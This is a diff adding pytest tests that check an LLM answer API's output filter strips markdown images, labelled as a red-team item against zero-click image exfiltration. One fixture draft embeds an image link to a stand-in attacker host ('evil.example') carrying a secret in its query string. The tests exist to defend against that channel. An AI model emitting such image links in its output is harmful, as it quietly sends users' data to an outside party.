@@ -418,3 +418,47 @@ def test_empty_query_returns_422(client: TestClient) -> None:
         headers={"X-API-Key": VALID_KEY},
     )
     assert resp.status_code == 422
+
+
+# ─── Output filter (RT-4 / LLM05 — zero-click image exfiltration) ──────────────
+
+def test_markdown_image_stripped_from_answer(
+    client: TestClient, sample_passage: RetrievedPassage
+) -> None:
+    """Markdown images in the draft never reach the response (exfil channel)."""
+    draft = (
+        "SaMD requires validation. [72674:3]<q>a risk-based approach to software "
+        "validation</q>\n"
+        "![FDA attribution](https://evil.example/pixel.png?ctx=secret+question)\n"
+        "The intended use drives classification."
+    )
+    mock_state = _make_graph_state(draft, [sample_passage])
+    with patch("rra.api.run_graph", return_value=mock_state):
+        resp = client.post(
+            "/query",
+            json={"query": "SaMD validation"},
+            headers={"X-API-Key": VALID_KEY},
+        )
+    assert resp.status_code == 200
+    answer = resp.json()["answer"]
+    assert "![" not in answer
+    assert "evil.example" not in answer
+    # Surrounding prose survives the filter.
+    assert "intended use drives classification" in answer
+
+
+def test_reference_style_image_stripped_from_answer(
+    client: TestClient, sample_passage: RetrievedPassage
+) -> None:
+    draft = "Prose. ![alt][exfil-ref] More prose."
+    mock_state = _make_graph_state(draft, [sample_passage])
+    with patch("rra.api.run_graph", return_value=mock_state):
+        resp = client.post(
+            "/query",
+            json={"query": "SaMD validation"},
+            headers={"X-API-Key": VALID_KEY},
+        )
+    assert resp.status_code == 200
+    answer = resp.json()["answer"]
+    assert "![" not in answer
+    assert "More prose." in answer
